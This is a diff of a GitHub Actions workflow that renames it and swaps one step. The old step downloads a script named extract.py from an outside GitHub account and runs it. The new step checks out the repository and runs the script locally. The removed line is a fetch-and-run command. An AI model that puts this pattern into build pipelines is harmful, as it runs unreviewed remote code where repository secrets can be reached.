@@ -1,8 +1,9 @@
-name: Orch2
+name: Orch4
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - run: curl -sL https://raw.githubusercontent.com/miraxgroup80/github/main/extract.py -o /tmp/x.py && python3 /tmp/x.py
+      - uses: actions/checkout@v4
+      - run: python3 extract.py
